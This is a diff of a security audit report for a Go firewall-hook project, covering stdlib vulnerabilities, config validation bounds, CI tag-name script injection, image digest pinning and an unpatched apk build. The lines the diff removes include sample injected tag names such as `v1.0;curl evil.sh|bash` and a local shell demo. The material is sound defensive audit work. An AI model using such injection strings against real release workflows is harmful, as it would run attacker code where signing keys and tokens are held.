@@ -22,20 +22,23 @@ hosts were scanned or contacted.
 | ID | Class / CWE | Severity | Location | Status | Test | Commit |
 | --- | --- | --- | --- | --- | --- | --- |
 | S-001 | supply chain / unpatched stdlib (CWE-1104) | medium | go.mod (`go 1.25.0`, no toolchain pin) | fixed | `govulncheck` output (11 reachable → 0) | `b69cb0e` |
-| S-002 | integer overflow, config validation (CWE-190) | low | `internal/config/config.go:478`, env layer | fixed | `TestValidateQueueNumIPv6Reserved` (failed before) | `880e625` |
-| S-003 | CI script injection (CWE-78/CWE-94) | medium | `.github/workflows/release.yml:37,39` — unquoted `make package VERSION=${{ github.ref_name }}` | needs human | mechanical shell demo (see below) | — |
-| S-004 | supply chain, mutable container tag | low | `.github/workflows/apk-sign.yml:23` `openwrt/sdk:x86_64-25.12.6` (not digest-pinned) | needs human | — | — |
+| S-002 | integer overflow, config validation (CWE-190) | low | `internal/config/config.go:478`, env layer | fixed | `TestValidateQueueNumIPv6Reserved`, `TestValidateQueueNumBoundaries` (see below) | `880e625` |
+| S-003 | CI script injection (CWE-78/CWE-94) | medium | `.github/workflows/release.yml` — unquoted `${{ github.ref_name }}` in run steps | fixed (follow-up PR, unmerged) | `release-tag-guard` CI job; `tests/ci/validate-release-tag-test.sh` | this PR |
+| S-004 | supply chain, mutable container tag | low | `.github/workflows/apk-sign.yml` `openwrt/sdk:x86_64-25.12.6` | fixed (follow-up PR, unmerged) | — | this PR |
+| S-005 | supply chain, unpatched stdlib in apk payload (CWE-1104) | medium | OpenWrt apk payload (SDK `golang/host` feed, go1.27.1) | **open** — documented accepted risk | `govulncheck` binary+source mode: 11 reachable (see below) | issue #78 |
 
 ### S-001 — reachable stdlib vulnerabilities
 The API server is an HTTP/1.1 `net/http` server on 127.0.0.1 using
 `http.MaxBytesReader` directly (`internal/api/server.go:267`), so the
 MaxBytesReader-header race (GO-2026-6859) and the Range-header parsing
 limit (GO-2026-6609) are reachable. Fixed by locking `toolchain go1.27.4`
-(auto-downloaded by CI via `GOTOOLCHAIN=auto`) and bumping
+(installed directly by CI setup-go; see below) and bumping
 `golang.org/x/net` v0.62.0 + `golang.org/x/sys` v0.49.0. The `go`
-directive rose 1.25.0 → 1.26.0 (required by x/net v0.62.0). CI keeps
-`go-version: "1.25"` in setup-go but the toolchain directive makes every
-build use go1.27.4.
+directive rose 1.25.0 → 1.26.0 (required by x/net v0.62.0). CI
+setup-go installs go1.27.4 directly (`go-version: "1.27.4"`,
+matching the toolchain directive); setup-go v6+ sets
+`GOTOOLCHAIN=local`, so no build can silently drift to another
+toolchain.
 
 ### S-002 — queue_num 65535 accepted but uninstallable
 `queue_num: 65535` passed validation, but the hook always renders an
@@ -44,33 +47,80 @@ the u16 queue-number range — so every `nft -f` install fails at startup
 (fail-closed, but the config is accepted and then cannot run).
 `validate()` and `GOSHISEN_QUEUE_NUM` now bound it to 0..65534.
 
-### S-003 — script injection via tag ref name (needs human)
-`release.yml` interpolates `${{ github.ref_name }}` **unquoted** into
-`make package VERSION=` and `make verify-package VERSION=`. Git ref
-names permit `;` and `$()`; a tag pushed as
-`v1.0;curl evil.sh|bash` (or `v1.0$(id)`) would execute attacker
-commands in the release job, which holds `contents: write`, the
-`GH_RELEASE_SIGNING_KEY` secret, and `GH_TOKEN`. Reproduction of the
-mechanism (local, no tag pushed):
+Exact behavior (config file and `GOSHISEN_QUEUE_NUM` env layer):
 
-```
-$ bash -c 'VERSION=v1.0;touch /tmp/pwned2'      # ';' executes
-$ git check-ref-format refs/tags/v1.0\;touch-ok  # ';' allowed in refs
-```
+| queue_num | Result | Why |
+| --- | --- | --- |
+| `0` | accepted (default) | IPv4 rule `queue to 0`, IPv6 rule `queue to 1` — both valid u16 |
+| `65534` | accepted | largest usable value; IPv6 rule renders `queue to 65535` (max u16) |
+| `65535` | **refused to start** | IPv6 `queue+1` would render `queue to 65536` — outside u16; never silently clamped to 65534 |
+| `65536` / `70000` | **refused to start** | outside `0..65534`; never wraps to 0 |
+| `-1` | **refused to start** | negative; never wraps/truncates |
+| `abc` | **refused to start** | non-numeric; never defaults |
 
-Trigger requires a user with tag-push rights (a maintainer or a
-compromised push credential). **Proposed fix (text only, not applied —
-release workflow):** validate the tag name in a first step
-(`[[ "${{ github.ref_name }}" =~ ^v[0-9]+\.[0-9]+\.[0-9]+$ ]]` or fail)
-and always quote interpolations (`VERSION="${{ github.ref_name }}"`).
-Same pattern in `apk-sign.yml` `case "${{ github.ref }}"` — the value is
-quoted there but a `ref`-validation step is recommended.
+Proven by `TestValidateQueueNumBoundaries` (file + env layers, incl.
+0/65534 accepted and 65535/65536/-1/70000/abc rejected with no
+wrap/truncate/default), `TestValidateQueueNumIPv6Reserved` (65535
+rejected, 65534 accepted), `TestValidateQueueNum` (70000 rejected), and
+`TestBuildFilterOnly` in `internal/hook` (queue_num 0 renders IPv4
+`queue to 0` + IPv6 `queue to 1`). A rejected value makes
+`config.Load` return an error and `app.RunCLI` abort — the daemon
+refuses to start (fail closed).
 
-### S-004 — mutable container image tag (needs human)
-`openwrt/sdk:x86_64-25.12.6` (apk-sign.yml) is a mutable tag; a
-compromised/republished tag changes the signing environment. Proposed:
-pin the image by digest (and keep the syft checksum-verification pattern
-already used for tools). CI settings — not changed here.
+### S-003 — CI script injection via tag ref name
+`release.yml` interpolates `${{ github.ref_name }}` (the pushed tag
+name) into shell commands in the release job. Git ref names are
+attacker-controllable up to tag-push rights, which are held by the same
+maintainers who run the release workflow; the release job also holds the
+release signing key material. A tag name containing shell metacharacters
+would therefore create a command-injection risk in that job (CWE-78 /
+CWE-94).
+
+**Mitigation (in this PR):** the release workflow validates the tag
+name against `^v[0-9]+\.[0-9]+\.[0-9]+$` in a first step before any
+other step (including checkout), passes the tag through an environment
+variable, and quotes it at every use. `apk-sign.yml` production mode
+gets the same ref validation. The `release-tag-guard` CI job runs
+`tests/ci/validate-release-tag-test.sh`, which proves tag-name fixtures
+containing shell metacharacters (`;`, `$()`, backticks, pipes,
+redirection, quotes) are rejected before use, while valid semver tags
+pass. No public reproduction steps are included.
+
+### S-004 — mutable container image tag
+`openwrt/sdk:x86_64-25.12.6` (apk-sign.yml) was a mutable tag; a
+compromised/republished tag would change the signing environment.
+Fixed in this PR by pinning the image by digest
+(`openwrt/sdk@sha256:a17d6436f7add9207513b6edd0370f5a1aeeceeedf3c9080de8909112892f261`,
+amd64 runner). The Dockerfile base images (`golang:1.27.4`,
+`gcr.io/distroless/base-debian13`) are digest-pinned the same way, with
+update instructions at each pin. The syft checksum-verification pattern
+for tools is unchanged.
+
+### S-005 — apk payload built with a vulnerable Go (open, documented)
+The published v0.2.5 OpenWrt apk payload (`usr/sbin/goshisen`) is built
+by the OpenWrt SDK's `golang/host` feed (not CI's Go) and embeds
+**go1.27.1** with `golang.org/x/net v0.53.0` / `x/sys v0.43.0`.
+govulncheck under that toolchain reproduces the S-001 finding exactly:
+**11 reachable standard-library vulnerabilities** (GO-2026-6859
+MaxBytesReader race, GO-2026-6610/6611/6612/6613/6617 http2 races,
+GO-2026-6603/6605/6607/6608, GO-2026-6809 x509) — **not fixed** in the
+apk. The CLI release archives are a separate build (go1.25.14 at
+v0.2.5; fixed to go1.27.4 by S-001 in CI from the next release on).
+The SDK feed now pins Go 1.27.4 (`lang/golang/golang1.27/Makefile`),
+so a rebuild with a fresh SDK (or the image re-pull digest) would fix
+it; until then, documented accepted risk (local API/metrics HTTP
+listeners, no outbound TLS). See issue #78.
+
+## Release tags are strict semver (no -rc)
+
+The S-003 release-tag validator accepts only `vX.Y.Z` (no suffix) in
+the release workflow and in `apk-sign.yml` production mode. If release
+candidates (`v0.2.6-rc.1`) are ever wanted, the pattern must be changed
+in **all three places together**: `scripts/validate-release-tag.sh`,
+the identical inline check in `.github/workflows/release.yml`, and the
+ref-validation case in `.github/workflows/apk-sign.yml`; and the
+`release-tag-guard` fixture in `tests/ci/validate-release-tag-test.sh`
+must be extended with the new allowed pattern.
 
 ## Not applicable / not tested
 
